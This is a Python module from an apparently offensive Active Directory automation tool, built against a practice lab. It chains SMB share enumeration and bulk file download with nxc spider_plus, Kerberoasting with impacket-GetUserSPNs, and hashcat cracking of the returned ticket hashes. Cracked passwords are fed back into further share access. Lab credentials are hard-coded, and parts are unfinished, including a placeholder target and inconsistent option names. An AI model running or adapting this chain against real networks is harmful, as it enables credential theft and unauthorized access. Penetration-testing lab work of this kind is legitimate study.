import subprocess
import sys
import os
from utils.nmap import *
from utils.dc_enumeration import *
from colorama import Fore, Style, init
from core.module_base import ModuleBase
from modules.no_cred import no_cred

init()

class basicAutomation(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "basic_automation"
        self.options = {
            "ip": None,
            "domain": None
        }
        self.actions = {
            "initial_enemuration": self.initial_enemurations,
            # "kerboroasting": self.kerboroasting_attack
        }
        self.found_users = []

    def prepare(self):
        ip = self.options["IP"]
        if not ip:
            print("[-] Need IP")
            return None
        ip_list = get_input_or_file(ip)
        return ip_list

    def banner(self):
        print(Fore.MAGENTA + f"\n🔥 MODULE {self.name.upper()} 🔥 \n" + Style.RESET_ALL)
        print("\n See options and set a target with 'options'\n")

    def run_spider_plus(self, username, password):
        """Helper function to run spider_plus module"""
        print('\n[+] Running spider_plus module on discovered shares...')
        command = f'nxc smb NEED TO IMPLEMENT -u {username} -p {password} -M spider_plus -o DOWNLOAD_FLAG=True'
        
        try:
            result = subprocess.run(command, shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            if result.returncode == 0:
                print('\n[+] Spider plus module completed successfully')
                return True
            else:
                print('\n[-] Error running spider plus...')
                return False
        except Exception as e:
            print(f'\n[-] Exception running spider plus: {e}')
            return False

    def check_smb_shares(self, username, password):
        """Helper function to check SMB shares"""
        no_cred_fun = no_cred.NoCred()
        no_cred_fun.set_option = self.options["ip"]
        result = no_cred_fun.run_normal_access_on_smb_shares(username, password)

        if result and '[*] Enumerated' in result:
            self.run_spider_plus(username, password)
        
        return result

    def handle_cracked_hash(self, hash_part, password):
        """Helper function to process cracked hashes"""
        try:
            user_part = hash_part.split("$")[3]
            username = user_part.split("*")[-1]
            
            if username and password:
                print(f"New user found!: {username}:{password}.")
                
                if input('Would you like to check smb shares?: Y/n').strip().lower() in ['y', '']:
                    self.check_smb_shares(username, password)
                
                self.found_users.append({"username": username, "password": password})
                
        except IndexError:
            pass

    ####
    def initial_enemurations(self, username='samwell.tarly', password='Haersbane'):
        ##smb_shares for specific users
        ##in the lab null session is not working properly so putted here staticly

        ## For real cases, use a func in no_cred  
        print(f'Valid user credentials found: {username}:{password}')
        self.found_users.append({"username": username, "password": password})
        
        self.check_smb_shares(username, password)

        ##filtering dc-ips and using on  
        if input(f"Credentials found: {username}:{password}. Would you like to start kerboroasting attack? Y/n") == 'Y':
            self.kerboroasting_attack()

    def kerboroasting_attack(self):

        ## not use for real case
        username = 'samwell.tarly'
        password = 'Haertsbane'
        command = f'impacket-GetUserSPNs -request -dc-ip {self.options["ip"]} north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.txt'

        try:
            result = subprocess.run(command, shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            
            if result.returncode == 0:
                print("\n[+] Kerberoasting attack completed. Output saved to 'kerberoasting.txt'.")
                print(result.stdout)

                if input("Would you like to read the output from 'kerberoasting.txt'? (Y/n): ").strip().lower() in ['y', '']:
                    if os.path.exists("kerberoasting.txt"):
                        with open("kerberoasting.txt", "r") as f:
                            content = f.read()
                            print("\n📄 --- File Content Start ---\n")
                            print(content)
                            print("\n📄 --- File Content End ---\n")

                            # Check if hash is present and ask to crack
                            if "$krb5tgs$" in content:
                                if input("Hash detected. Do you want to try cracking it with Hashcat? (Y/n): ").strip().lower() in ['y', '']:
                                    crack_command = "hashcat -m 13100 kerberoasting.txt resources/rockyou.txt --force"
                                    
                                    print(f"\n[+] Starting Hashcat: {crack_command}")
                                    try:
                                        subprocess.run(crack_command, shell=True)
                                        show_cracked = subprocess.run("hashcat -m 13100 kerberoasting.txt --show", 
                                                                    shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                                        if show_cracked.returncode == 0 and show_cracked.stdout.strip():
                                            for line in show_cracked.stdout.strip().splitlines():
                                                if ':' not in line:
                                                    continue
                                                hash_part, password = line.strip().split(":", 1)
                                                if "$krb5tgs$" in hash_part:
                                                    self.handle_cracked_hash(hash_part, password)
                                        else:
                                            print("[-] No hashes were cracked or an error occurred during --show.")

                                    except Exception as e:
                                        print(f"[-] Error while running Hashcat: {e}")
                            else:
                                print("[-] No Kerberos hashes found in the output.")
                    else:
                        print("[-] File 'kerberoasting.txt' does not exist!")
            else:
                print(f"[-] Error:\n{result.stderr}")
        except Exception as e:
            print(f"\n[-] Exception: {e}")
